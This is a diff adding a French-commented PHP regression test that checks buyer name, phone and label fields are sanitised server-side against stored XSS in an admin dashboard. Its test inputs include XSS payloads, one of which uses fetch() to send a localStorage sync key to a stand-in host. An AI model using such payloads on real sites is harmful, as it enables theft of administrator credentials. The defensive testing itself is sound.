@@ -904,6 +904,40 @@ titre("9. Lecture du droit : l'echeance referme vraiment");
 })();
 
 // ════════════════════════════════════════════════════════════════════════════
+// 10. SAISIE DE L'ACHETEUR : elle ne doit jamais entrer dans la base en HTML
+// ════════════════════════════════════════════════════════════════════════════
+/* Audit du 19/11/2026. Nom, téléphone et libellé arrivent du navigateur de
+   n'importe qui à l'initialisation d'un paiement ; l'octroi les recopiait dans
+   `visitorOrders`, que le tableau de bord affichait en HTML. Un nom
+   « <img src=x onerror=…> » tournait dans le navigateur de l'administrateur,
+   celui qui détient la clé de synchronisation. app.js échappe désormais ces
+   champs ; ce contrôle tient la seconde barrière, côté serveur. */
+titre("10. Saisie de l'acheteur filtrée avant d'entrer dans la base");
+(function () {
+    $db = baseDeTest();
+    $etat = paiement('book', 'bk1', 5000, [
+        'ref'       => 'VTXSS-' . strtoupper(bin2hex(random_bytes(3))),
+        'clientNom' => '<img src=x onerror=fetch("//e.example/"+localStorage.vrt10_cc)>',
+        'clientTel' => '"><svg onload=alert(1)>',
+        'label'     => "Manuel — <script>alert('x')</script>",
+    ]);
+    $r = vrt_grant_entitlement($db, $etat);
+    $o = $db['visitorOrders'][0] ?? null;
+    ok('la commande est bien créée (le filtrage ne bloque pas la vente)', !empty($r['changed']) && is_array($o), json_encode($r));
+    $champs = $o ? [$o['nom'] ?? '', $o['tel'] ?? '', $o['bookTitle'] ?? ''] : ['<'];
+    $sale = array_filter($champs, function ($v) { return preg_match('/[<>"`]/', (string) $v); });
+    ok('aucun chevron, guillemet ni accent grave dans nom / tel / titre', !$sale, json_encode($champs, JSON_UNESCAPED_UNICODE));
+
+    // Un vrai nom ne doit pas être abîmé : l'apostrophe et les accents restent.
+    $db2 = baseDeTest();
+    $r2 = vrt_grant_entitlement($db2, paiement('book', 'bk1', 5000, [
+        'ref' => 'VTNOM-' . strtoupper(bin2hex(random_bytes(3))), 'clientNom' => "Awa N'Diaye-Ébélé",
+    ]));
+    ok('un nom réel passe intact', ($db2['visitorOrders'][0]['nom'] ?? '') === "Awa N'Diaye-Ébélé",
+       json_encode($db2['visitorOrders'][0] ?? null, JSON_UNESCAPED_UNICODE));
+})();
+
+// ════════════════════════════════════════════════════════════════════════════
 // BILAN
 // ════════════════════════════════════════════════════════════════════════════
 $total = $T['ok'] + $T['ko'];
